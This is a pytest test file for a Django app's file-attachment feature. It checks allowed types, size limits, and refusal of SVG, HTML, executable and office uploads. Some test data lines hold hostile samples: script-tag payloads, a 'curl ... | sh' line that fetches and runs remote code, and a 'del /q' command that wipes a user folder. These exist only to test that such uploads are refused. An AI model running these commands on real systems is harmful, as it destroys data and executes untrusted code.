import pytest

from apps.files.models import Attachment
from apps.files.uploads import MAX_SIZE, MAX_VIDEO_SIZE
from apps.requests.models import Request

from .conftest import M4A, MP4, PDF, PNG, WEBM_AUDIO, WEBM_VIDEO, upload

pytestmark = pytest.mark.django_db

URL = "/requests/new/"


@pytest.fixture
def signed_in(client, anna):
    client.force_login(anna)
    return anna


def sent(*files):
    return {
        "type": "idea",
        "title": "Remind us about quiet leads",
        "why": "We lose deals we could have saved",
        "when_needed": "not_sure",
        "attachments": list(files),
    }


def test_client_attaches_a_screenshot_to_a_new_request(client, signed_in, private_folder):
    client.post(URL, sent(upload("duplicates.png", PNG)))

    attachment = Attachment.objects.get()
    assert attachment.request == Request.objects.get()
    assert (attachment.name, attachment.content_type, attachment.size) == (
        "duplicates.png",
        "image/png",
        len(PNG),
    )
    assert attachment.uploaded_by == signed_in
    # Stored under its random id, not under the client's file name.
    assert (private_folder / str(attachment.id)).read_bytes() == PNG


def test_new_request_takes_up_to_five_files_at_once(client, signed_in):
    files = [upload(f"step-{n}.png", PNG) for n in range(5)]

    client.post(URL, sent(*files))

    assert Attachment.objects.count() == 5


def test_six_files_at_once_are_refused(client, signed_in):
    response = client.post(URL, sent(*[upload(f"step-{n}.png", PNG) for n in range(6)]))

    assert response.status_code == 422
    assert "Attach up to 5 files at a time." in response.content.decode()
    assert not Request.objects.exists()


@pytest.mark.parametrize(
    ("name", "content", "content_type"),
    [
        ("lead.jpg", b"\xff\xd8\xff\xe0\x00\x10JFIF", "image/jpeg"),
        ("blink.gif", b"GIF89a\x01\x00\x01\x00", "image/gif"),
        ("photo.webp", b"RIFF\x24\x00\x00\x00WEBPVP8 ", "image/webp"),
        ("spec.pdf", PDF, "application/pdf"),
        ("export.log", "Timeout at 10:42 — export of 12 000 leads".encode(), "text/plain"),
        ("leads.csv", b"name,phone\nMaria,+1 415 555 0132\n", "text/plain"),
    ],
)
def test_images_pdf_and_plain_text_are_accepted(client, signed_in, name, content, content_type):
    client.post(URL, sent(upload(name, content)))

    assert Attachment.objects.get().content_type == content_type


@pytest.mark.parametrize(
    ("name", "content", "content_type"),
    [
        ("form-submit.mp4", MP4, "video/mp4"),
        ("IMG_0042.MOV", MP4.replace(b"isom", b"qt  ", 1), "video/quicktime"),
        ("screen.webm", WEBM_VIDEO, "video/webm"),
        ("voice-note.m4a", M4A, "audio/mp4"),
        ("voice-note.webm", WEBM_AUDIO, "audio/webm"),
        ("call.mp3", b"ID3\x04\x00\x00\x00\x00\x00\x00" + b"\xff\xfb" * 8, "audio/mpeg"),
        ("call.ogg", b"OggS\x00\x02" + b"\x00" * 20, "audio/ogg"),
        ("call.wav", b"RIFF\x24\x00\x00\x00WAVEfmt ", "audio/wav"),
    ],
)
def test_video_and_audio_are_accepted(client, signed_in, name, content, content_type):
    client.post(URL, sent(upload(name, content)))

    assert Attachment.objects.get().content_type == content_type


def test_sound_only_recording_is_audio_whatever_its_name(client, signed_in):
    client.post(URL, sent(upload("screen-recording.mp4", M4A)))

    assert Attachment.objects.get().content_type == "audio/mp4"


def test_matroska_video_is_refused_because_safari_cannot_play_it(client, signed_in):
    mkv = WEBM_VIDEO.replace(b"\x84webm", b"\x88matroska")

    response = client.post(URL, sent(upload("clip.mkv", mkv)))

    assert response.status_code == 422
    assert "clip.mkv: attach images, video, audio" in response.content.decode()


def test_video_up_to_20_mb_is_accepted(client, signed_in):
    client.post(URL, sent(upload("bug.mp4", MP4 + b"\x00" * (MAX_VIDEO_SIZE - len(MP4)))))

    assert Attachment.objects.get().size == MAX_VIDEO_SIZE


def test_video_over_20_mb_is_refused_with_a_hint_to_share_a_link(client, signed_in):
    response = client.post(URL, sent(upload("bug.mp4", MP4 + b"\x00" * MAX_VIDEO_SIZE)))

    assert response.status_code == 422
    assert "bug.mp4 is over 20 MB. Share a link to Google Drive, Loom or YouTube" in (
        response.content.decode()
    )


def test_audio_keeps_the_10_mb_limit(client, signed_in):
    response = client.post(URL, sent(upload("talk.m4a", M4A + b"\x00" * MAX_SIZE)))

    assert response.status_code == 422
    assert "talk.m4a is over 10 MB" in response.content.decode()


def test_type_comes_from_the_content_not_the_name(client, signed_in):
    client.post(URL, sent(upload("screenshot.txt", PNG)))

    assert Attachment.objects.get().content_type == "image/png"


@pytest.mark.parametrize(
    ("name", "content"),
    [
        ("logo.svg", b'<svg xmlns="http://www.w3.org/2000/svg"><script>alert(1)</script></svg>'),
        ("logo.png", b'<?xml version="1.0"?><svg xmlns="http://www.w3.org/2000/svg"/>'),
        ("page.png", b"<!DOCTYPE html><html><script>alert(1)</script></html>"),
        ("tool.png", b"MZ\x90\x00\x03\x00\x00\x00"),
        ("notes.txt", b"#!/bin/sh\ncurl https://example.com/x | sh\n"),
    ],
)
def test_svg_html_and_programs_are_refused_whatever_their_name(client, signed_in, name, content):
    response = client.post(URL, sent(upload(name, content)))

    assert response.status_code == 422
    assert f"{name}: attach images, video, audio, PDF or plain text." in response.content.decode()
    assert not Request.objects.exists()


@pytest.mark.parametrize("name", ["report.docx", "budget.xlsx", "old-report.doc", "logs.zip"])
def test_office_files_and_archives_are_refused_with_a_hint_to_share_a_link(client, signed_in, name):
    content = b"\xd0\xcf\x11\xe0\xa1\xb1\x1a\xe1" if name.endswith(".doc") else b"PK\x03\x04"

    response = client.post(URL, sent(upload(name, content + b"\x00" * 32)))

    assert response.status_code == 422
    assert "Word, Excel and archive files aren’t accepted" in response.content.decode()


def test_file_over_10_mb_is_refused(client, signed_in):
    response = client.post(URL, sent(upload("huge.png", PNG + b"\x00" * MAX_SIZE)))

    assert response.status_code == 422
    assert "huge.png is over 10 MB" in response.content.decode()


def test_every_refused_file_is_named_at_once(client, signed_in):
    response = client.post(URL, sent(upload("a.svg", b"<svg/>"), upload("b.zip", b"PK\x03\x04")))

    page = response.content.decode()
    assert "a.svg: attach images" in page
    assert "b.zip: Word, Excel and archive files" in page


def test_nothing_is_saved_when_the_form_has_errors(client, signed_in, private_folder):
    response = client.post(URL, {**sent(upload("duplicates.png", PNG)), "title": ""})

    assert response.status_code == 422
    assert not Attachment.objects.exists()
    assert not any(private_folder.iterdir())
    assert "Attach your files again" in response.content.decode()


def test_form_explains_why_office_files_are_not_taken(client, signed_in):
    page = client.get(URL).content.decode()

    assert "Word, Excel and archives can hide macros, so share a link" in page


@pytest.mark.parametrize(
    ("name", "saved_as"),
    [
        ("cleanup.bat", "cleanup.bat.txt"),
        ("open.command", "open.command.txt"),
        ("notes", "notes.txt"),
    ],
)
def test_text_file_never_keeps_a_name_that_runs_on_double_click(client, signed_in, name, saved_as):
    client.post(URL, sent(upload(name, b"del /q C:\\Users\\*")))

    assert Attachment.objects.get().name == saved_as
